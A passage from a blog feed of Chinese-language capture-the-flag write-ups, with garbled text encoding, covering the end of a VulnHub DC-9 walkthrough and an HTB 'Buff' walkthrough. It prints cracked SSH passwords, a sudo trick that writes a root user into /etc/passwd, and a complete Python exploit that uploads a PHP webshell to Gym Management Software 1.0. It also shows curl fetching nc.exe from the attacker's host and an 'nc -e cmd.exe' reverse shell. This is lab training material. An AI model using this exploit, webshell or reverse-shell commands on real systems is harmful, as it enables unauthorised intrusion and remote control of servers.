UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: janitor   password: Ilovepeepee</span><br><span class="line">[STATUS] 368.00 tries/min, 368 tries <span class="keyword">in</span> 00:01h, 25 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 16 active</span><br><span class="line">1 of 1 target successfully completed, 4 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-02 04:14:40</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x09-fredfç™»å…¥"><a href="#0x09-fredfç™»å…¥" class="headerlink" title="0x09.fredfç™»å…¥"></a>0x09.fredfç™»å…¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> fredf on dc-9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User fredf may run the following commands on dc-9:</span><br><span class="line">    (root) NOPASSWD: /opt/devstuff/dist/<span class="built_in">test</span>/<span class="built_in">test</span></span><br><span class="line">fredf@dc-9:~$</span><br></pre></td></tr></table></figure><h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>æŸ¥çœ‹test</code></p><blockquote><p>æ­¤ä»£ç å«ä¹‰ï¼š</p><p>ä¸€å…±ä¸¤ä¸ªâ€å‚æ•°ï¼ˆæ–‡ä»¶ï¼‰â€ï¼Œæ‰“å¼€ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯»å–é‡Œé¢æ–‡ä»¶èµ‹å€¼ç»™outputï¼›æ‰“å¼€ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œå†™å…¥outputï¼Œå…³é—­ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff$ cat test.py </span><br><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != 3 :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[1], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[2], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line">fredf@dc-9:/opt/devstuff$</span><br></pre></td></tr></table></figure><p><code>æ—¢ç„¶è¿™æ ·å°±å¯ä»¥å‘/etc/passwdå†™å…¥æ–‡ä»¶</code></p><p><code>ç”±äº/etc/passwdçš„ç¬¬äºŒä¸ªå­—æ®µå—åˆ°å¯†ç ä¿æŠ¤ï¼Œæ‰€ä»¥å…ˆç”Ÿæˆå£ä»¤</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># openssl passwd -1 -salt demo 123</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$demo</span><span class="variable">$N8rNOM51XVLc6Sj7cqsmT</span>/</span><br><span class="line">root@JIYE:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¼–è¾‘</span><br><span class="line">fredf@dc-9:~$ <span class="built_in">echo</span> <span class="string">&#x27;demo:$1$demo$N8rNOM51XVLc6Sj7cqsmT/:0:0::/root:/bin/bash&#x27;</span> &gt; /tmp/demo</span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/<span class="built_in">test</span>$ sudo ./<span class="built_in">test</span> /tmp/demo /etc/passwd</span><br><span class="line">fredf@dc-9:/opt/devstuff/dist/<span class="built_in">test</span>$ su demo</span><br><span class="line">Password: </span><br><span class="line">root@dc-9:/opt/devstuff/dist/<span class="built_in">test</span><span class="comment"># cd</span></span><br><span class="line">root@dc-9:~<span class="comment"># ls</span></span><br><span class="line">theflag.txt</span><br><span class="line">root@dc-9:~<span class="comment"># cat theflag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line">â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â•šâ•â•  â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â•     â•šâ•â•â•â•šâ•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have <span class="keyword">done</span> well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge <span class="keyword">in</span> the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks <span class="keyword">for</span> all the fish.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@dc-9:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00-å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00.å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.&lt;/p&gt;
&lt;p&gt;The ultimate goal of this challenge is to get root and to read the one and only flag.&lt;/p&gt;
&lt;p&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.&lt;/p&gt;
&lt;p&gt;For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    <category term="DC" scheme="https://lunamoore.github.io/categories/vulnhub/DC/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[buff]</title>
    <link href="https://lunamoore.github.io/2020/09/01/HTB-buff/"/>
    <id>https://lunamoore.github.io/2020/09/01/HTB-buff/</id>
    <published>2020-09-01T14:55:09.000Z</published>
    <updated>2020-09-05T09:21:58.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/09/01/HTB-buff/image-20200905172118673.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¼€æ”¾äº†8080ç«¯å£</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nmap -sC -sV -sT 10.10.10.198 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 02:33 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.198</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">|_http-title: mrb3n<span class="string">&#x27;s Bro Hut</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 60.65 seconds</span></span><br><span class="line"><span class="string">root@JIYE:~/htb/buff# </span></span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®8080"><a href="#0x02-è®¿é—®8080" class="headerlink" title="0x02.è®¿é—®8080"></a>0x02.è®¿é—®8080</h2><p><code>æ‰‹åŠ¨çˆ¬è™«å‘ç°ä½¿ç”¨äº†Gym Management Software 1.0</code></p><img src="/2020/09/01/HTB-buff/image-20200901144251166.png" class><h2 id="0x03-æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE"><a href="#0x03-æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE" class="headerlink" title="0x03.æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE"></a>0x03.æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE</h2><p><code>åˆ©ç”¨è¯¦æƒ…</code></p><blockquote><p> <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDg1MDY=">exp url<i class="fa fa-external-link-alt"></i></span></p><p> 1.è®¿é—®â€œ /upload.phpâ€é¡µé¢ï¼Œå› ä¸ºå®ƒä¸æ£€æŸ¥ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¼šè¯ã€‚</p><p> 2.å°†GETè¯·æ±‚çš„â€™idâ€™å‚æ•°è®¾ç½®ä¸ºæ‰€ä¸Šä¼ çš„PHPæ–‡ä»¶æ‰€éœ€çš„æ–‡ä»¶åã€‚</p><p> 3.é€šè¿‡æ·»åŠ ä¸¤ä¸ªæ‰©å±•ç»•è¿‡æ‰©å±•ç™½åå•ï¼Œæœ€åä¸€ä¸ªä½œä¸ºå¯æ¥å—çš„æ‰©å±•ï¼ˆPNGï¼‰ã€‚</p><p> 4.é€šè¿‡åœ¨POSTè¯·æ±‚ä¸­å°†â€™fileâ€™å‚æ•°çš„â€™Content-Typeâ€™ä¿®æ”¹ä¸ºâ€™image / pngâ€™æ¥ç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æŸ¥ï¼Œå¹¶å°†â€™puploadâ€™å‚æ•°è®¾ç½®ä¸ºâ€™uploadâ€™ã€‚</p><p> 5.åœ¨POSTè¯·æ±‚çš„â€œfileâ€å‚æ•°çš„ä¸»ä½“ä¸­ï¼Œæ’å…¥æ¶æ„çš„PHPä»£ç ï¼š</p> <?php echo shell_exec($_GET["telepathy"]); ?><p> 6.Webåº”ç”¨ç¨‹åºå°†å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œä½¿å…¶å…·æœ‰ä»æ–‡ä»¶åç§°åˆ›å»ºçš„æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªæ‰©å±•é¡¹;ç”±â€™.â€™å­—ç¬¦åˆ†å¼€ã€‚</p><p> 7.ä½¿ç”¨å¸¦æœ‰telepathyå‚æ•°çš„GETè¯·æ±‚ï¼Œä¸ä½äºâ€™/upload.php?id=kamehamehaâ€™çš„webshellè¿›è¡Œé€šä¿¡ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import requests, sys, urllib, re</span><br><span class="line">from colorama import Fore, Back, Style</span><br><span class="line">requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">def webshell(SERVER_URL, session):</span><br><span class="line">    try:</span><br><span class="line">        WEB_SHELL = SERVER_URL+<span class="string">&#x27;upload/kamehameha.php&#x27;</span></span><br><span class="line">        getdir  = &#123;<span class="string">&#x27;telepathy&#x27;</span>: <span class="string">&#x27;echo %CD%&#x27;</span>&#125;</span><br><span class="line">        r2 = session.get(WEB_SHELL, params=getdir, verify=False)</span><br><span class="line">        status = r2.status_code</span><br><span class="line">        <span class="keyword">if</span> status != 200:</span><br><span class="line">            <span class="built_in">print</span> Style.BRIGHT+Fore.RED+<span class="string">&quot;[!] &quot;</span>+Fore.RESET+<span class="string">&quot;Could not connect to the webshell.&quot;</span>+Style.RESET_ALL</span><br><span class="line">            r2.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(Fore.GREEN+<span class="string">&#x27;[+] &#x27;</span>+Fore.RESET+<span class="string">&#x27;Successfully connected to webshell.&#x27;</span>)</span><br><span class="line">        cwd = re.findall(<span class="string">&#x27;[CDEF].*&#x27;</span>, r2.text)</span><br><span class="line">        cwd = cwd[0]+<span class="string">&quot;&gt; &quot;</span></span><br><span class="line">        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            thought = raw_input(term)</span><br><span class="line">            <span class="built_in">command</span> = &#123;<span class="string">&#x27;telepathy&#x27;</span>: thought&#125;</span><br><span class="line">            r2 = requests.get(WEB_SHELL, params=<span class="built_in">command</span>, verify=False)</span><br><span class="line">            status = r2.status_code</span><br><span class="line">            <span class="keyword">if</span> status != 200:</span><br><span class="line">                r2.raise_for_status()</span><br><span class="line">            response2 = r2.text</span><br><span class="line">            <span class="built_in">print</span>(response2)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\r\nExiting.&quot;</span>)</span><br><span class="line">        sys.exit(-1)</span><br><span class="line"></span><br><span class="line">def formatHelp(STRING):</span><br><span class="line">    <span class="built_in">return</span> Style.BRIGHT+Fore.RED+STRING+Fore.RESET</span><br><span class="line"></span><br><span class="line">def header():</span><br><span class="line">    BL   = Style.BRIGHT+Fore.GREEN</span><br><span class="line">    RS   = Style.RESET_ALL</span><br><span class="line">    FR   = Fore.RESET</span><br><span class="line">    SIG  = BL+<span class="string">&#x27;            /\\\n&#x27;</span>+RS</span><br><span class="line">    SIG += Fore.YELLOW+<span class="string">&#x27;/vvvvvvvvvvvv &#x27;</span>+BL+<span class="string">&#x27;\\&#x27;</span>+FR+<span class="string">&#x27;--------------------------------------,\n&#x27;</span></span><br><span class="line">    SIG += Fore.YELLOW+<span class="string">&#x27;`^^^^^^^^^^^^&#x27;</span>+BL+<span class="string">&#x27; /&#x27;</span>+FR+<span class="string">&#x27;============&#x27;</span>+Fore.RED+<span class="string">&#x27;BOKU&#x27;</span>+FR+<span class="string">&#x27;=====================&quot;\n&#x27;</span></span><br><span class="line">    SIG += BL+<span class="string">&#x27;            \/&#x27;</span>+RS+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="built_in">return</span> SIG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> header();</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="built_in">print</span> formatHelp(<span class="string">&quot;(+) Usage:\t python %s &lt;WEBAPP_URL&gt;&quot;</span> % sys.argv[0])</span><br><span class="line">        <span class="built_in">print</span> formatHelp(<span class="string">&quot;(+) Example:\t python %s &#x27;https://10.0.0.3:443/gym/&#x27;&quot;</span> % sys.argv[0])</span><br><span class="line">        sys.exit(-1)</span><br><span class="line">    SERVER_URL = sys.argv[1]</span><br><span class="line">    UPLOAD_DIR = <span class="string">&#x27;upload.php?id=kamehameha&#x27;</span></span><br><span class="line">    UPLOAD_URL = SERVER_URL + UPLOAD_DIR</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.get(SERVER_URL, verify=False)</span><br><span class="line">    PNG_magicBytes = <span class="string">&#x27;\x89\x50\x4e\x47\x0d\x0a\x1a&#x27;</span></span><br><span class="line">    png     = &#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>: </span><br><span class="line">                  (</span><br><span class="line">                    <span class="string">&#x27;kaio-ken.php.png&#x27;</span>, </span><br><span class="line">                    PNG_magicBytes+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;&lt;?php echo shell_exec($_GET[&quot;telepathy&quot;]); ?&gt;&#x27;</span>, </span><br><span class="line">                    <span class="string">&#x27;image/png&#x27;</span>, </span><br><span class="line">                    &#123;<span class="string">&#x27;Content-Disposition&#x27;</span>: <span class="string">&#x27;form-data&#x27;</span>&#125;</span><br><span class="line">                  ) </span><br><span class="line">              &#125;</span><br><span class="line">    fdata   = &#123;<span class="string">&#x27;pupload&#x27;</span>: <span class="string">&#x27;upload&#x27;</span>&#125;</span><br><span class="line">    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)</span><br><span class="line">    webshell(SERVER_URL, s)</span><br></pre></td></tr></table></figure><h2 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04.exploit"></a>0x04.exploit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python2 gymrce.py http://10.10.10.198:8080/</span></span><br><span class="line">            /\</span><br><span class="line">/vvvvvvvvvvvv \--------------------------------------,</span><br><span class="line">`^^^^^^^^^^^^ /============BOKU=====================<span class="string">&quot;</span></span><br><span class="line"><span class="string">            \/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Successfully connected to webshell.</span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt; </span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt; whoami</span></span><br><span class="line"><span class="string">ï¿½PNG</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buff\shaun</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-éªŒè¯"><a href="#0x05-éªŒè¯" class="headerlink" title="0x05.éªŒè¯"></a>0x05.éªŒè¯</h2><blockquote><p>åˆ©ç”¨å®Œæˆå°±å¯ä»¥ä½¿ç”¨å¸¦æœ‰telepathyå‚æ•°çš„GETè¯·æ±‚ï¼Œä¸ä½äºâ€™/upload.php?id=kamehamehaâ€™çš„webshellè¿›è¡Œé€šä¿¡ã€‚</p></blockquote><img src="/2020/09/01/HTB-buff/image-20200901153655031.png" class><h2 id="0x06-åå¼¹shell"><a href="#0x06-åå¼¹shell" class="headerlink" title="0x06.åå¼¹shell"></a>0x06.åå¼¹shell</h2><p><code>ä¸Šä¼ nc.exe</code></p><blockquote><p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9Y3VybA==">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl<i class="fa fa-external-link-alt"></i></span> -O <span class="exturl" data-url="aHR0cDovLzEwLjEwLjE3LjIxNi9uYy5leGU=">http://10.10.17.216/nc.exe<i class="fa fa-external-link-alt"></i></span></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># cp /usr/share/windows-binaries/nc.exe ./htb/buff/</span></span><br><span class="line">root@JIYE:~<span class="comment"># cd htb/buff/</span></span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># ls</span></span><br><span class="line">gymrce.py  nc.exe  nmap.CVT</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/09/01/HTB-buff/image-20200901200724402.png" class><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.198 - - [01/Sep/2020 03:53:36] <span class="string">&quot;GET /nc.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>åå¼¹</code></p><blockquote><p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9bmM=">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc<i class="fa fa-external-link-alt"></i></span> -e cmd.exe 10.10.17.216 6666</p></blockquote><img src="/2020/09/01/HTB-buff/image-20200901155912608.png" class><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.198] 51130</span><br><span class="line">Microsoft Windows [Version 10.0.17134.1610]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">buff\shaun</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;<span 